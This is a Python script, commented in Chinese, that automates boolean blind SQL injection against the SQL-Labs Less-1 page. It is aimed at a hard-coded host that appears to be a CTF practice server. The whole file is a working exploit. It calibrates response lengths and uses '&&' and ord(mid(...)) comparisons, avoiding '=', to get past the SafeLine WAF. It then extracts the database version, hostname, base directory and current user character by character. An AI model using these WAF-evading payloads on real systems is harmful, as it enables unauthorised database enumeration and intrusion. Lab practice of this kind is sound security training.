#!/usr/bin/env python3
"""
SQL-Labs Less-1 长亭雷池WAF绕过 - 布尔盲注自动化脚本
用法: python3 sqli_blind.py [选项]
"""

import urllib.parse
import urllib.request
import sys
import time
import re

TARGET = "http://home.ctfstu.cn:6868/sql/Less-1/"

# 基准 TRUE/FALSE 长度
TRUE_LEN = None
FALSE_LEN = None

def http_get(url):
    """发送HTTP GET请求返回内容长度"""
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=10) as resp:
            content = resp.read()
            return len(content)
    except Exception as e:
        return -1

def calibrate():
    """校准 TRUE 和 FALSE 的基准长度"""
    global TRUE_LEN, FALSE_LEN
    
    # TRUE: && 1=1
    true_url = TARGET + "?id=1'%20%26%26%201=1--+"
    TRUE_LEN = http_get(true_url)
    
    # FALSE: && 1=2
    false_url = TARGET + "?id=1'%20%26%26%201=2--+"
    FALSE_LEN = http_get(false_url)
    
    print(f"[*] TRUE 基准长度: {TRUE_LEN}")
    print(f"[*] FALSE 基准长度: {FALSE_LEN}")
    
    if TRUE_LEN == FALSE_LEN or TRUE_LEN < 0 or FALSE_LEN < 0:
        print("[!] 基准校准失败!")
        sys.exit(1)
    
    # 计算阈值 (中间值)
    return (TRUE_LEN + FALSE_LEN) // 2

def check_condition(condition_url):
    """检查条件是否为真（返回长度接近TRUE）"""
    length = http_get(condition_url)
    if length < 0:
        return False, -1
    # 使用TRUE/FALSE基准判断
    threshold = (TRUE_LEN + FALSE_LEN) // 2
    is_true = abs(length - TRUE_LEN) < abs(length - FALSE_LEN)
    return is_true, length

def blind_extract(description, condition_template, charset=None):
    """通用的布尔盲注逐字符提取"""
    if charset is None:
        # 常见字符集: 数字+小写字母+下划线+点
        charset = "0123456789abcdefghijklmnopqrstuvwxyz_-.{}"
    
    result = ""
    pos = 1
    while True:
        found = False
        for ch in charset:
            code = ord(ch)
            # 构造: && ord(mid(EXPR,pos,1))=code
            # 用 mid 替代 substring，用 ord 替代 ascii
            # 注意：= 符号会被WAF检测，如果要绕过需要不同比较方式
            # 先试 >
            
            # 使用二分法: ord(mid(expr,pos,1)) > mid
            # 先试 ord() 比较
            condition = condition_template.format(pos=pos, ch=ch, code=code)
            full_url = TARGET + "?id=1'%20%26%26%20" + condition + "--+"
            
            is_true, _ = check_condition(full_url)
            if is_true:
                result += ch
                print(f"\r[+] {description}: {result}", end="", flush=True)
                found = True
                break
        
        if not found:
            # 没找到对应字符，可能已经结束了
            if len(result) == 0:
                print(f"\n[-] 位置 {pos} 无法匹配")
            break
        
        pos += 1
        # 安全限制：最多200字符
        if pos > 200:
            break
    
    print()
    return result

def blind_extract_binary(description, expr_template, max_len=64):
    """
    二分法逐字符提取
    使用: && ord(mid(EXPR,pos,1))>CODE
    """
    result = ""
    
    # 先确定长度
    print(f"[*] 正在确定 {description} 长度...")
    length = 0
    for i in range(1, max_len + 1):
        cond = f"length({expr_template})={i}"
        full_url = TARGET + "?id=1'%20%26%26%20" + cond + "--+"
        is_true, _ = check_condition(full_url)
        if is_true:
            length = i
            print(f"[+] {description} 长度: {length}")
            break
        length = -1
    
    if length <= 0:
        print(f"[-] 无法确定长度")
        return ""
    
    # 逐字符二分法
    for pos in range(1, length + 1):
        low, high = 32, 126  # 可打印ASCII
        ch = None
        
        while low <= high:
            mid = (low + high) // 2
            # 不用 = 而用 >= 
            cond = f"ord(mid({expr_template},{pos},1))>={mid}"
            full_url = TARGET + "?id=1'%20%26%26%20" + cond + "--+"
            is_true, _ = check_condition(full_url)
            
            if is_true:
                ch = mid
                low = mid + 1
            else:
                high = mid - 1
        
        if ch is not None:
            result += chr(ch)
            print(f"\r[+] {description}: {result}", end="", flush=True)
        else:
            break
    
    print()
    return result

def main():
    print("=" * 60)
    print("SQL-Labs Less-1 布尔盲注 (雷池WAF绕过)")
    print("=" * 60)
    
    # 校准
    print("\n[*] 校准基准...")
    calibrate()
    
    print("\n" + "=" * 60)
    print("开始信息收集")
    print("=" * 60)
    
    # 1. @@version (已知可通过)
    print("\n[*] 提取 @@version...")
    # length
    for i in range(1, 30):
        cond = f"length(@@version)={i}"
        url = TARGET + "?id=1'%20%26%26%20" + cond + "--+"
        is_true, _ = check_condition(url)
        if is_true:
            print(f"[+] @@version 长度: {i}")
            
            # 逐字符二分提取
            ver = ""
            for pos in range(1, i+1):
                low, high = 32, 126
                ch = None
                while low <= high:
                    mid = (low + high) // 2
                    cond = f"ord(mid(@@version,{pos},1))>={mid}"
                    url = TARGET + "?id=1'%20%26%26%20" + cond + "--+"
                    is_true, _ = check_condition(url)
                    if is_true:
                        ch = mid
                        low = mid + 1
                    else:
                        high = mid - 1
                if ch:
                    ver += chr(ch)
                    print(f"\r[+] @@version: {ver}", end="", flush=True)
            print()
            break
    
    # 2. @@hostname
    print("\n[*] 提取 @@hostname...")
    for i in range(1, 30):
        cond = f"length(@@hostname)={i}"
        url = TARGET + "?id=1'%20%26%26%20" + cond + "--+"
        is_true, _ = check_condition(url)
        if is_true:
            print(f"[+] @@hostname 长度: {i}")
            host = ""
            for pos in range(1, i+1):
                low, high = 32, 126
                ch = None
                while low <= high:
                    mid = (low + high) // 2
                    cond = f"ord(mid(@@hostname,{pos},1))>={mid}"
                    url = TARGET + "?id=1'%20%26%26%20" + cond + "--+"
                    is_true, _ = check_condition(url)
                    if is_true:
                        ch = mid
                        low = mid + 1
                    else:
                        high = mid - 1
                if ch:
                    host += chr(ch)
                    print(f"\r[+] @@hostname: {host}", end="", flush=True)
            print()
            break
    
    # 3. @@basedir
    print("\n[*] 提取 @@basedir...")
    for i in range(1, 100):
        cond = f"length(@@basedir)={i}"
        url = TARGET + "?id=1'%20%26%26%20" + cond + "--+"
        is_true, _ = check_condition(url)
        if is_true:
            print(f"[+] @@basedir 长度: {i}")
            basedir = ""
            for pos in range(1, i+1):
                low, high = 32, 126
                ch = None
                while low <= high:
                    mid = (low + high) // 2
                    cond = f"ord(mid(@@basedir,{pos},1))>={mid}"
                    url = TARGET + "?id=1'%20%26%26%20" + cond + "--+"
                    is_true, _ = check_condition(url)
                    if is_true:
                        ch = mid
                        low = mid + 1
                    else:
                        high = mid - 1
                if ch:
                    basedir += chr(ch)
                    print(f"\r[+] @@basedir: {basedir}", end="", flush=True)
            print()
            break
    
    # 4. user() - 需要用version()函数调用的方式来试
    print("\n[*] 提取 user()...")
    for i in range(1, 50):
        cond = f"length(user())={i}"
        url = TARGET + "?id=1'%20%26%26%20" + cond + "--+"
        is_true, _ = check_condition(url)
        if is_true:
            print(f"[+] user() 长度: {i}")
            uname = ""
            for pos in range(1, i+1):
                low, high = 32, 126
                ch = None
                while low <= high:
                    mid = (low + high) // 2
                    cond = f"ord(mid(user(),{pos},1))>={mid}"
                    url = TARGET + "?id=1'%20%26%26%20" + cond + "--+"
                    is_true, _ = check_condition(url)
                    if is_true:
                        ch = mid
                        low = mid + 1
                    else:
                        high = mid - 1
                if ch:
                    uname += chr(ch)
                    print(f"\r[+] user(): {uname}", end="", flush=True)
            print()
            break
    
    print("\n" + "=" * 60)
    print("信息收集完成!")
    print("=" * 60)

if __name__ == "__main__":
    main()
